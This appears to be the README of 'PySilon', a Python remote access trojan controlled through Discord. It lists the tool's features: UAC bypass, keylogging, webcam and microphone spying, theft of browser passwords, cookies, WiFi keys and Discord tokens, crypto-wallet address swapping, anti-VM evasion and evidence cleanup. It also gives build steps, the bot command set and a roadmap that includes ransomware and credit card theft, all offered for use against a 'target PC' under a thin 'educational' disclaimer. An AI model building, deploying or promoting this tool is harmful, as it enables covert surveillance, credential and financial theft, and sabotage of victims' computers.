<span align='center'>

# `PySilon Malware`

<p align='center'><img src="https://user-images.githubusercontent.com/44233157/205148071-ed0f810e-be71-4b18-8c6b-94e838ebda5d.png" width=500 /></p>

`Advanced RAT malware written in Python, fully controllable through Discord with dedicated GUI builder to make preparation easier.`

</span>

--------------------

## Wiki

Read our extensive Wiki for more information and detailed building instructions.

[![Wiki](https://img.shields.io/badge/wiki-link-blue?style=for-the-badge&logo=gitbook&logoColor=white)](https://github.com/mategol/PySilon-malware/wiki)

## Telegram Group

Join our Telegram group for suppork, to ask questions, recommend features and talk to like minded people!

[![Telegram - Group](https://img.shields.io/badge/pysilon-community-blue?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/+8razFyklyFw2OWU0)

## Telegram Channel

Join our Telegram channels to always stay up-to-date with the most recent updates and interact with the community!

[![Telegram - Channel](https://img.shields.io/badge/pysilon-announcements-blue?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/pysilon)

--------------------

# Table of contents
- <a href="https://github.com/mategol/PySilon-malware#disclaimer">Disclaimer</a>
- <a href="https://github.com/mategol/PySilon-malware#features">Features</a>
- <a href="https://github.com/mategol/PySilon-malware#preparation">Preparation</a>
- <a href="https://github.com/mategol/PySilon-malware#available-commands">Available commands</a>
- <a href="https://github.com/mategol/PySilon-malware#setup">Setup</a>
- <a href="https://github.com/mategol/PySilon-malware#building-standalone-executable">Building executable</a>
- <a href="https://github.com/mategol/PySilon-malware#autonomic-features">Autonomic features</a>
- <a href="https://github.com/mategol/PySilon-malware#commands-manual">Commands manual</a>

--------------------

# Disclaimer
> Information and code provided on this repository are for educational purposes only. The creator is no way responsible for any direct or indirect damage caused due to the misusage of the information. Everything you do, you are doing at your own risk and responsibility.

--------------------

# Features
### PySilon malware can do plenty of things, like:
- handle multiple PCs (not only one, like in most of the cases)
- UAC Bypass (gain *Administrative permissions* on startup)
- log every key pressed on *keyboard*
- take *screenshots* anytime you want
- record *screen* anytime you want
- take images from *webcam*
- *block* the *mouse* and *keyboard*
- steal saved *WiFi* passwords
- record *microphone* input (24/7) and save it in *.wav* files
- stream live *microphone* input on voice channel
- browse *files* on target PC
- upload and download *files* from target PC
- grab *history*, *cookies* and *passwords* saved in web browsers
- grab *discord tokens* and system information
- browse and kill running *processes*
- execute files
- replace copied *crypto currency wallet* addresses to your [configured] ones
- trigger *Blue Screen of Death*
- execute *fork bomb* (crash the PC)
- *Anti-VM* (PySilon wont run on Virtual Machines, f.ex.: VirtualBox, VMWare)
- run *CMD* commands
- ***Debug Mode*** for easier testing and `contribution`

--------------------

# Preparation<br />

`git clone https://github.com/mategol/pysilon-malware`<br />
`cd pysilon-malware`<br />
<a href="https://github.com/mategol/pysilon-malware#setup">`Create Discord BOT and server`</a><br />
***Windows:*** `Run the PySilon.bat either from Command Line or double clicking on it`<br />
***Linux:*** `Run the PySilon.sh from Command Line`<br />

--------------------

# Available commands
<a href="https://github.com/mategol/pysilon-malware#ss">`.ss`</a> - take screenshot at any time<br />
<a href="https://github.com/mategol/pysilon-malware#ss">`.screenrec`</a> - record the screen for 15 seconds<br />
<a href="https://github.com/mategol/pysilon-malware#ss">`.webcam`</a> - take a picture from connected webcam<br />
<a href="https://github.com/mategol/pysilon-malware#ss">`.block-input`</a> - block the mouse and keyboard (`.unblock-input` to unblock it)<br />
<a href="https://github.com/mategol/pysilon-malware#grab-what-to-grab">`.grab <what-to-grab>`</a> - grab for example saved passwords in web browsers<br />
<a href="https://github.com/mategol/pysilon-malware#join">`.join`</a> - join voice-channel and stream live microphone input<br />
<a href="https://github.com/mategol/pysilon-malware#pwd">`.pwd`</a> - show working directory<br />
<a href="https://github.com/mategol/pysilon-malware#tree">`.tree`</a> - show tree of working directory<br />
<a href="https://github.com/mategol/pysilon-malware#cd-directory">`.cd <dir>`</a> - change working directory<br />
<a href="https://github.com/mategol/pysilon-malware#ls">`.ls`</a> - list content of working directory<br />
<a href="https://github.com/mategol/pysilon-malware#upload-type-filename">`.upload <type> [name]`</a> - upload any file or zipped directory (also greater than 8MB ones) onto target PC<br />
<a href="https://github.com/mategol/pysilon-malware#download-file-or-directory">`.download <file-or-dir>`</a> - download any file or zipped directory (also greater than 8MB ones) from target PC<br />
<a href="https://github.com/mategol/pysilon-malware#show-what-to-show">`.show <what-to-show>`</a> - get list of running processes or available commands<br />
<a href="https://github.com/mategol/pysilon-malware#kill-process-id">`.kill <process-id>`</a> - kill any running process<br />
<a href="https://github.com/mategol/pysilon-malware#execute-file">`.execute <file>`</a> - run any file on target PC<br />
<a href="https://github.com/mategol/pysilon-malware#ss">`.start-clipper`</a> - start crypto-clipper (swap crypto currency wallet addresses to your ones, `.stop-clipper` to stop it)<br />
<a href="https://github.com/mategol/pysilon-malware#ss">`.bsod`</a> - trigger Blue Screen of Death<br />
<a href="https://github.com/mategol/pysilon-malware#ss">`.forkbomb`</a> - execute fork bomb<br />
<a href="https://github.com/mategol/pysilon-malware#remove-file-or-dir">`.remove <file-or-dir>`</a> - remove file or directory on target PC<br />
<a href="https://github.com/mategol/pysilon-malware#implode">`.implode`</a> - remove PySilon from target PC and clean the "evidence"<br />
<a href="https://github.com/mategol/pysilon-malware#clear">`.clear`</a> - clear messages from file-related channel<br />

--------------------

### Donation methods

- XMR: ```45wj2aubQQQfswkuojCQhZgHCs67nabskhrwYTDEaVmkPtcXZmrkqKKSV1JuhXLU8QfnkyagZXyBM1a9fPHrVyJkGrBxtiB```
- Paypal: ```mateusz.golembowski.2002@gmail.com```

--------------------

### ToDo

List of features that should appear in following releases:

- [ ] optional ransomware
- [ ] webhook connection in case of unexpected circumstances (like BOT-Token banned by Discord)
- [ ] overall system info grabber with cool Discord Embeds
- [ ] traditional reverse shell creator
- [ ] grab credit cards information
- [ ] optional crypto mining (for example, when victim is idle)
- [ ] grab sessions from popular applications (Steam/Minecraft/Metamask/Exodus/Roblox)
- [ ] optimize the code to consume less resources/memory
